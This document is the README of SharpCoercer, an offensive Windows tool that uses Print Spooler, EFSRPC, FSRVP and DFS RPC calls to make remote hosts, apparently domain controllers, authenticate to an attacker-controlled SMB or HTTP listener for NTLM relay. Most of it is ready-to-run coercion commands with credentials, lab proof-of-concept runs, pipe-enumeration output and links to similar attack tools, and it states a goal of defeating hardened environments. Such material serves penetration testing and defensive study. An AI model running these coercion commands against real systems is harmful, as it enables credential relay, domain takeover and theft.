# SharpCoercer

**SharpCoercer** is a .NET Framework 4.8 tool, that triggers authentication attempts from remote Windows hosts via RPC-based coercion techniques. It supports both SMB- and HTTP-based coercion, allowing you to redirect a target host’s authentication flow to a listener you control.

---

## 🔧 Features

- **Protocol Coercion**: SMB and HTTP transport for authentication relay.
- **Port Customization**: Specify non-default SMB (445) and HTTP (80) ports.
- **Discovery & Filtering**:
  - List available RPC clients and named pipes.
  - Enumerate RPC methods per client.
  - Filter by RPC client name, method name, or pipe name.
- **Flexible Invocation**:
  - Single-run or unattended (`-always-continue`) modes.
  - Optional domain credentials or current user token.
- **Extensible Architecture**:
  - Add new RPC clients by implementing the `IRpcClient` interface.

---

## ⚙️ Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/your-org/SharpCoercer.git
   cd SharpCoercer
   ```
2. Build with Visual Studio (targeting .NET Framework 4.8) or via MSBuild:
   ```bash
   msbuild /p:Configuration=Release SharpCoercer.sln
   ```
3. The compiled executable will be located in `bin/Release`.

---

## 🚀 Usage

```text
SharpCoercer.exe -t <target> -l <listener> [options]
```

### Required Arguments

| Switch            | Description                                          |
| ----------------- | ---------------------------------------------------- |
| `-t`, `-target`   | Remote host to coerce (IP address or DNS name).      |
| `-l`, `-listener` | Your SMB share or HTTP listener (IP address or DNS). |

### Optional Arguments

| Switch                           | Description                                                |                                      |
| -------------------------------- | ---------------------------------------------------------- | ------------------------------------ |
| `-a`, `-auth-type`               | Coercion transport smb or http coercion  (default: `smb`)  |  |
| `-sp`, `-smb-port` `<port>`      | SMB port (default: `445`).                                 |                                      |
| `-hp`, `-http-port` `<port>`     | HTTP port (default: `80`).                                 |                                      |
| `-d`, `-domain` `<domain>`       | Domain name for supplied credentials.                      |                                      |
| `-u`, `-username` `<user>`       | Username for RPC binding.                                  |                                      |
| `-p`, `-password` `<pass>`       | Password for RPC binding.                                  |                                      |
| `-np`, `-namedpipe-filter` `<n>` | Filter named pipes by substring.                           |                                      |
| `-r`, `-rpc-filter` `<n>`        | Filter RPC client classes by substring.                    |                                      |
| `-m`, `-method-filter` `<n>`     | Filter RPC methods by substring.                           |                                      |
| `-lr`, `-listrpcs`               | List all available RPC clients and exit.                   |                                      |
| `-lp`, `-listPipes`              | List all available named pipes and exit.                   |                                      |
| `-lf`, `-listfunctions`          | List all RPC methods (with optional `-r` filter) and exit. |                                      |
| `-c`, `-always-continue`         | Skip interactive prompts between calls.                    |                                      |
| `-e`, `-enumerate `              | Enumerate all available named pipes on the target and attempt to bind to each one. |              |

### Example

```powershell
# Coerce via SMB (default) using domain credentials
SharpCoercer.exe -t 192.168.1.10 -l 192.168.1.20 \
    -d CORP -u Administrator -p "P@ssw0rd"

# Coerce via HTTP listener on custom port
SharpCoercer.exe -t dc1.corp.local -l mylistener.example.com \
    -a http -hp 8080 -c

# Enumerate RPC methods for the MS-RPRN client
SharpCoercer.exe -lr -r RprnRpcClient -lf
```

---
## Poc of SMB Coercion
  ```powershell
  .\SharpCoercer.exe -t dc.hecker.local -u adam -p Temp123 -d hecker.local -l 192.168.163.129 -c
```

https://github.com/user-attachments/assets/90130a4b-49c2-4479-b26d-a17ab9d7bb1d

## Poc of HTTP Coercion
  ```powershell
  .\SharpCoercer.exe -t dc.hecker.local -u adam -p Temp123 -d hecker.local -l 192.168.163.129 -c -a http
  ```
  
### Notes on HTTP Coercion
- Web Client must be enabled on the target machine
-  WebDAV authentication only works if the domain name can be resolved via DNS or NetBIOS. You can’t coerce HTTP authentication unless you have NetBIOS name resolution or you’ve created a DNS record in Active Directory DNS

https://github.com/user-attachments/assets/dc336987-5aba-402e-a037-c48fffd8e604

---

## 📦 Supported RPC Clients

| Interface        | Named Pipe      | Description                         |
| ---------------- | --------------- | ----------------------------------- |
| `RprnRpcClient`  | `\PIPE\spoolss` | MS-RPRN (Print Spooler)             |
| `FsrvpRpcClient` | `\PIPE\winsvr`  | MS-FSRVP (File Server VSS)          |
| `DfsmRpcClient`  | `\PIPE\dfsnm`   | MS-DFSNM (DFS Namespace Management) |
| `EfsRpcClient`   | `\PIPE\lsarpc`  | EFSRPC (Encrypting File System)     |

---

## Available Methods
  ```powershell
.\SharpCoercer.exe -lf
  ```
  ```Available RPC Methods:

[MS-DFSNM] (An RPC interface through which clients remotely configure and manage DFS namespaces)
  - NetrDfsRemoveStdRoot
  - NetrDfsAddStdRoot

[MS-EFSR] (RPC-based protocol for remote maintenance of encrypted network file data.)
  - EfsRpcAddUsersToFile
  - EfsRpcEncryptFileSrv
  - EfsRpcDecryptFileSrv
  - EfsRpcQueryRecoveryAgents
  - EfsRpcQueryUsersOnFile
  - EfsRpcRemoveUsersFromFile
  - EfsRpcFileKeyInfo
  - EfsRpcOpenFileRaw
  - EfsRpcDuplicateEncryptionInfoFile
  - EfsRpcAddUsersToFileEx

[MS-FSRVP] (The File Server Remote VSS Protocol (FSRVP) is an RPC-based service for creating application-consistent shadow copies of remote file shares.)
  - IsPathSupported
  - IsPathShadowCopied

[MS-RPRN] (RPC-based protocol for synchronous printing, spooling, and print job management.)
  - RpcRemoteFindFirstPrinterChangeNotificationEx
```
---
## Available Pipes
```powershell
.\SharpCoercer.exe -lp
```
```text
Available Pipes:
  - \pipe\netdfs
  - \pipe\netlogon
  - \pipe\efsrpc
  - \pipe\fssagentrpc
  - \pipe\spoolss
  - \pipe\lsarpc
  - \pipe\lsass
  - \pipe\samr
```
## Available RPC Protocols
```powershell
.\SharpCoercer.exe -lr
```
```text
Available RPC Clients:
  - MS-DFSNM
  - MS-EFSR
  - MS-FSRVP
  - MS-RPRN
```
## Enumerate Pipes on the targets
```powershell
.\SharpCoercer.exe -e -t 192.168.163.128 -u adam -p Temp123 -d hecker
```
```text
[+] Using auth-type: SMB, SMB port: 445, HTTP port: 80
[+] Using credentials: hecker\adam:Temp123
[+] Connected to \\192.168.163.128\IPC$ as hecker\adam

== MS-DFSNM ==
[+] Found pipe \pipe\netdfs on 192.168.163.128
Binding to 192.168.163.128 \pipe\netdfs
binding ok (handle=2305824077904)

== MS-EFSR ==
[+] Found pipe \pipe\netlogon on 192.168.163.128
Binding to 192.168.163.128 \pipe\netlogon
binding ok (handle=2305824085616)

== MS-EFSR ==
[-] Pipe \PIPE\efsrpc missing on 192.168.163.128, skipping

== MS-FSRVP ==
[+] Found pipe \pipe\FssagentRpc on 192.168.163.128
Binding to 192.168.163.128 \pipe\FssagentRpc
binding ok (handle=2305824134848)

== MS-RPRN ==
[+] Found pipe \pipe\spoolss on 192.168.163.128

== MS-EFSR ==
[+] Found pipe \pipe\lsarpc on 192.168.163.128
Binding to 192.168.163.128 \pipe\lsarpc
binding ok (handle=2305824135248)

== MS-EFSR ==
[+] Found pipe \PIPE\lsass on 192.168.163.128
Binding to 192.168.163.128 \PIPE\lsass
binding ok (handle=2305824135648)

== MS-EFSR ==
[+] Found pipe \PIPE\samr on 192.168.163.128
Binding to 192.168.163.128 \PIPE\samr
binding ok (handle=2305824136048)
```

## 🔗 Reference Guide

- **MITM and Coerced Authentications**  
  https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/  
  A deep-dive tutorial covering NTLM relay, SMB/HTTP coercion, and advanced RPC-based authentication coercion techniques.
---
## 🛠️ Tools and Code Samples

### SharpSystemTriggers  
https://github.com/cube0x0/SharpSystemTriggers  
C# tool to trigger Windows system services (e.g., Print Spooler, Certificate Authority) via HTTP requests, causing remote hosts to authenticate back to an attacker-controlled listener.

### PetitPotam  
https://github.com/topotam/PetitPotam  
Python implementation of the EFSRPC protocol methods (excluding patched ones) to coerce a target into sending NTLM authentication to a remote SMB or HTTP listener.

### SpoolSample  
https://github.com/leechristensen/SpoolSample  
Minimal C# proof-of-concept demonstrating how to invoke the MS-RPRN (Print Spooler) RPC interface to force authentication over SMB or HTTP.

### printerbug.py (krbrelayx)  
https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py  
Python script in the Kerberos relay toolkit that abuses the Print Spooler (MS-RPRN) to capture Kerberos tickets and/or relay authentication to other services.

### ShadowCoerce  
https://github.com/ShutdownRepo/ShadowCoerce  
C# and Python payloads to exploit unpatched EFSRPC methods for NTLM coercion, similar to PetitPotam but with additional automation and payload flexibility.

### DFSCoerce  
https://github.com/Wh04m1001/DFSCoerce  
C# tool targeting the MS-DFSNM (DFS Namespace Management) RPC interface, coercing remote hosts to authenticate to a specified SMB/HTTP listener via DFS calls.

---

## Limitations

1. **x64 Only**  
   The tool is only supported on 64-bit (x86_64) systems. It will not run on 32-bit architectures.

2. **NTLM-Disabled Environments**  
   On systems where NTLM authentication has been disabled (for example via Group Policy), it is not possible to coerce authentication over SMB/HTTP from remote, non–domain-joined machines.

## Feature Work

- **x86 Support**  
  Add compatibility for 32-bit Windows hosts.

- **Alternative Coercion Methods**  
  Research and implement Kerberos-based or other non-NTLM coercion techniques.

- **Hardened Systems**  
  Develop fallback mechanisms or detection routines to enable coercion in environments with NTLM turned off.
----
## 🤝 Contributing

Pull requests are welcome. Feel free to open an issue if you want to add other features.

---

## Credits

 - [@tifkin_](https://twitter.com/tifkin_) and [@elad_shamir](https://twitter.com/elad_shamir) for finding and implementing **PrinterBug** on [MS-RPRN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1)
 - [@topotam77](https://twitter.com/topotam77) for finding and implementing **PetitPotam** on [MS-EFSR](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)
 - [@topotam77](https://twitter.com/topotam77) for finding and [@_nwodtuhs](https://twitter.com/_nwodtuhs) for implementing **ShadowCoerce** on [MS-FSRVP](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b)
 - [@filip_dragovic](https://twitter.com/filip_dragovic) for finding and implementing **DFSCoerce** on [MS-DFSNM](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979)
  - [@evilashz](https://github.com/evilashz/) for finding and implementing **CheeseOunce** on [MS-EVEN](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)

---

